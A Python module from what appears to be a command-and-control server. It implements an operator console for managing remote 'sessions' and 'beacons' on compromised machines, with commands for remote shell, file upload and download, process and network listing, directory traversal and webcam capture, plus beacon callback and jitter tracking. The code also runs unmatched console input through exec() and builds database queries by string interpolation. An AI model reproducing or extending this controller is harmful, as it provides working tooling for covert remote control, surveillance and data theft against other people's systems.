"""
multi handler commands. Functions to complete tasks within
the multi handler menu. conn and r_address variables are ,
connection and address variables fed in from the specified socket.
this allows for multiple connections to be interacted with.
"""

from .sessions_commands import SessionCommandsClass
from ServerDatabase.database import DatabaseClass
from .beacon_commands import BeaconCommandsClass
from .global_objects import (
    remove_connection_list,
    sessions_list,
    send_data,
    receive_data,
    config,
    tab_completion,
    beacon_list,
    remove_beacon_list,
    add_beacon_command_list
)

from typing import Tuple
from tabulate import tabulate
import hashlib
import os
import tqdm
import colorama
import socket
import readline
import ssl
import time


class MultiHandlerCommands:
    """
    class with  multihandler commands, each multi handler
    can call the class and have access to the commands
    """
    def __init__(self) -> None:
        self.sessioncommands = SessionCommandsClass()
        self.beaconCommands = BeaconCommandsClass()
        self.database = DatabaseClass()
        colorama.init(autoreset=True)
        return

    def current_client_session(self, conn: ssl.SSLSocket,
                               r_address: Tuple[str, int], user_ID) -> None:
        """
        function that interacts with an individual session, from here
        commands on the target can be run as documented in the config
        the functions are stored in the SessionCommands.py file
        """
        """
        available_commands = WordCompleter(['shell', 'close', 'processes',
        'sysinfo', 'close', 'checkfiles', 'download', 'upload', 'services',
        'netstat', 'diskusage', 'listdir'])
        """
        def handle_beacon():
            for beaconID, session in beacon_list.items():
                if beaconID == user_ID:
                    self.sessioncommands.change_beacon(
                        conn, r_address, beaconID)
            return

        command_handlers = {
            "shell": lambda: self.sessioncommands.shell(
                conn, r_address),
            "close": lambda: self.sessioncommands.close_connection(
                conn, r_address),
            "processes": lambda: self.sessioncommands.list_processes(
                conn, r_address),
            "sysinfo": lambda: self.sessioncommands.systeminfo(
                conn, r_address),
            "checkfiles": lambda: self.sessioncommands.checkfiles(
                conn),
            "download": lambda: self.sessioncommands.DownloadFiles(
                conn),
            "upload": lambda: self.sessioncommands.UploadFiles(
                conn),
            "services": lambda: self.sessioncommands.list_services(
                conn, r_address),
            "netstat": lambda: self.sessioncommands.netstat(
                conn, r_address),
            "diskusage": lambda: self.sessioncommands.diskusage(
                conn, r_address),
            "listdir": lambda: self.sessioncommands.list_dir(
                conn, r_address),
            "beacon": handle_beacon
        }

        while True:
            # resets colorama after each statement
            colorama.init(autoreset=True)
            readline.parse_and_bind("tab: complete")
            readline.set_completer(
                lambda text, state:
                    tab_completion(text, state, [
                        "shell", "close", "processes", "sysinfo", "checkfiles",
                        "download", "upload", "services", "netstat",
                        "diskusage", "listdir", "beacon"
                    ]))
            command = (input(colorama.Fore.YELLOW +
                             f"{r_address[0]}:{r_address[1]} Command: ")
                       .lower())
            if command == "exit":  # exits back to multihandler menu
                break
            try:  # calls command
                handler = command_handlers.get(command)
                if handler:
                    handler()
                    if command == "close":
                        return
                else:
                    if not exec(command):
                        print((colorama.Fore.GREEN +
                               config['SessionModules']['help']))
            except (KeyError, SyntaxError, AttributeError) as e:
                # if the command is not matched then it prints help menu
                print((colorama.Fore.GREEN +
                       config['SessionModules']['help']) + str(e) +
                      "Error HERE")
        return

    def use_beacon(self, UserID, IPAddress) -> None:
        """
        function that interacts with an individual session, from here
        commands on the target can be run as documented in the config
        the functions are stored in the SessionCommands.py file
        """
        """
        available_commands = WordCompleter(['shell', 'close', 'processes',
        'sysinfo', 'close', 'checkfiles', 'download', 'upload', 'services',
        'netstat', 'diskusage', 'listdir', directoryTraversal', 'takePhoto'])
        """
        def handle_session():
            for beaconID, beacon in beacon_list.items():
                if beacon.uuid == UserID:
                    print(colorama.Fore.GREEN +
                          "Beacon will change to session mode" +
                          " after the next callback")
                    add_beacon_command_list(UserID, None, "session", "")

                    remove_beacon_list(beaconID)
                    break
            else:
                print(colorama.Fore.RED +
                      "Beacon with the specified UUID not found.")
            return

        command_handlers = {
            "shell": lambda: self.beaconCommands.shell(UserID, IPAddress),
            "listdir": lambda: self.beaconCommands.list_dir(UserID, IPAddress),
            "close": lambda: self.beaconCommands.close_connection(UserID),
            "processes": lambda: self.beaconCommands.list_processes(UserID),
            "sysinfo": lambda: self.beaconCommands.systeminfo(UserID),
            "diskusage": lambda: self.beaconCommands.disk_usage(UserID),
            "netstat": lambda: self.beaconCommands.netstat(UserID),
            "session": handle_session,
            "commands": lambda: self.beaconCommands.list_db_commands(UserID),
            "directorytraversal": lambda: self.beaconCommands.dir_traversal(
                UserID),
            "takephoto": lambda: self.beaconCommands.takePhoto(UserID)
        }

        while True:
            # resets colorama after each statement
            colorama.init(autoreset=True)
            readline.parse_and_bind("tab: complete")
            readline.set_completer(
                lambda text, state:
                    tab_completion(text, state, [
                        "shell", "processes", "sysinfo", "close",
                        "listdir", "diskusage", "netstat", "session",
                        "commands", "directoryTraversal", "takePhoto"
                    ]))
            command = (input(colorama.Fore.YELLOW +
                             f"{UserID} Command: ").lower())
            if command == "exit":  # exits back to multihandler menu
                break
            try:  # calls command
                handler = command_handlers.get(command)
                if handler:
                    handler()
                    if command == "close":
                        return
                else:
                    if not exec(command):
                        print((colorama.Fore.GREEN + "NEED TO ADD HELP MENU"))
            except (KeyError, SyntaxError, AttributeError) as e:
                print(colorama.Fore.RED + str(e) + "Error HERE")
        return

    def listconnections(self) -> None:
        """
        List all active connections stored in the global objects variables
        """
        # Sessions table
        if len(sessions_list) == 0:
            print(colorama.Fore.RED + "No Active Sessions")
        else:
            print("Sessions:")
            table = []
            for userID, session in sessions_list.items():
                table.append((userID, session.hostname,
                              session.address, session.operating_system))
            print(colorama.Fore.WHITE + tabulate(
                table, headers=["UUID", "Hostname", "Address", "OS"],
                tablefmt="grid"))

        # Beacons table
        if len(beacon_list) == 0:
            print(colorama.Fore.RED + "No Active Beacons")
        else:
            print("Beacons:")
            table = []
            for userID, beacon in beacon_list.items():
                row = [
                    beacon.hostname,
                    beacon.operating_system,
                    beacon.address,
                    beacon.uuid,
                    beacon.last_beacon
                ]
                try:
                    next_beacon_time = time.strptime(
                        beacon.next_beacon, "%a %b %d %H:%M:%S %Y")
                    current_time = time.strptime(
                        time.asctime(), "%a %b %d %H:%M:%S %Y")

                    if time.mktime(current_time) > time.mktime(
                            next_beacon_time):
                        time_diff = time.mktime(current_time) - time.mktime(
                            next_beacon_time)
                        if time_diff < beacon.jitter:
                            row.append(f"Expected Callback was {beacon.next_beacon}. It is {int(time_diff)} seconds late. (Within Jitter)") # noqa
                            row_color = colorama.Fore.YELLOW
                        else:
                            row.append(f"Expected Callback was {beacon.last_beacon}. It is {int(time_diff)} seconds late") # noqa
                            row_color = colorama.Fore.RED
                    else:
                        row.append(f"Next Callback expected {beacon.next_beacon} in {int(time.mktime(next_beacon_time) - time.mktime(current_time))} seconds") # noqa
                        row_color = colorama.Fore.WHITE
                except ValueError:
                    row.append("Awaiting first call")
                    row_color = colorama.Fore.WHITE
                table.append((row, row_color))

            # Print the table with color
            for row, row_color in table:
                print(row_color +
                      tabulate([row], headers=["Host", "OS", "IP", "ID",
                                               "Last Callback", "Status"],
                               tablefmt="grid"))

    def sessionconnect(self) -> None:
        """allows interaction with individual session,
            passes connection details through to the current_client function"""
        try:
            if len(sessions_list) == 1:
                userID, session = list(sessions_list.items())[0]
                self.current_client_session(
                    session.details,
                    session.address,
                    userID
                )
            else:
                data = int(input("What client? "))
                userID, session = list(sessions_list.items())[data]
                self.current_client_session(
                    session.details,
                    session.address,
                    userID
                )
        except (IndexError, ValueError):
            print(
                colorama.Fore.WHITE +
                colorama.Back.RED +
                "Not a Valid Client")
        return

    def close_all_connections(self) -> None:
        """
        close all connections and remove the details
        from the lists in global objects
        """
        error = False
        for i, conn in enumerate(sessions_list):
            try:
                send_data(conn.details, "shutdown")
                if receive_data(conn.details) == "ack":
                    conn.details.shutdown(socket.SHUT_RDWR)
                    conn.details.close()
                if not config["server"]["quiet_mode"]:
                    print(
                        colorama.Back.GREEN +
                        f"Closed {conn.address}")
            except Exception as e:  # handles ssl.SSLEOFError
                print(colorama.Back.RED +
                      f"Error Closing + {conn.address}")
                print(colorama.Back.RED + str(e))
                error = True
                pass
        sessions_list.clear()
        if not error:
            print(
                colorama.Back.GREEN +
                "All connections closed")  # user message
        else:
            print(colorama.Back.RED + "Not all connections could be closed")
        return

    def close_from_multihandler(self) -> None:
        """allows an indiviudal client to be closed the multi handler menu"""
        try:
            readline.set_completer(
                    lambda text, state: tab_completion(
                        text, state, (list(sessions_list.keys())
                                      + list(beacon_list.keys()))))
            data = int(input("What client do you want to close? (UUID) "))
            for sessionID, session in sessions_list.items():
                if sessionID == data:
                    self.sessioncommands.close_connection(
                        session.details,
                        session.address)
                    remove_connection_list(sessionID)
                    print(colorama.Back.GREEN + "Session Closed")
            else:
                for beaconID, _ in beacon_list.items():
                    if beaconID == data:
                        self.beaconCommands.close_connection(beaconID)
                        remove_beacon_list(beaconID)
                        print(colorama.Back.GREEN +
                              "Beacon will shutdown at next callback")
        except ValueError:
            print(colorama.Back.RED + "Not a valid connection")
        except IndexError:
            pass
        return

    def localDatabaseHash(self) -> None:
        """
        allows local files to be hased and stored in the database.
        Has the ability to check check if its a directory
        or file and respond accordingly
        """
        dir = input(
            "What directory or file do you want to hash?: ")
        length = 0
        fileList = []
        try:
            try:
                files = os.scandir(dir)
                for entry in files:
                    try:
                        if entry.is_file():
                            length += 1
                            fileList.append(entry.name)
                    except PermissionError:
                        pass
            except PermissionError:
                print(colorama.Back.RED + "Permission Error")
            for i in tqdm.tqdm(
                    range(
                        0,
                        length),
                    desc="Files Hashed",
                    colour="#39ff14"):
                try:
                    self.hashfile(f"{dir}/{fileList[i]}")
                except (IsADirectoryError, PermissionError):
                    pass
                i += 1  # increment loading bar +1
            print(colorama.Back.GREEN + ("Files Hashed"))
        except NotADirectoryError:
            try:
                self.hashfile(dir)
                print(colorama.Back.GREEN + ("File Hashed"))
            except PermissionError:
                print(
                    colorama.Back.RED +
                    f"Permission error on {dir}")
        except (IsADirectoryError, FileNotFoundError):
            # print error message
            print(colorama.Back.RED + "File or Directory Does not exist")

    def hashfile(self, file: str) -> None:
        """
        hashes a file fed into it and calls the datbase
        function to add to the database
        """
        with open(file, 'rb') as directoryFiles:
            # hashes as sha256 and sends into addHashToDatabase
            self.addHashToDatabase(
                file, hashlib.sha256(
                    directoryFiles.read(
                        os.path.getsize(file))).hexdigest())
            directoryFiles.close()  # closes file
            return

    def addHashToDatabase(self, file: str, hashedFile: str) -> None:
        """
        checks if the hash is in the database, if not adds it to the database
        """
        # Properly format the search query
        result = self.database.search_query(
            "*",
            "Hashes",
            "Hash",
            f'"{hashedFile}"'
        )

        if result is None:  # search database
            # Properly format the insert entry
            self.database.insert_entry(
                "Hashes", f'"{file}","{hashedFile}"'
            )
        return
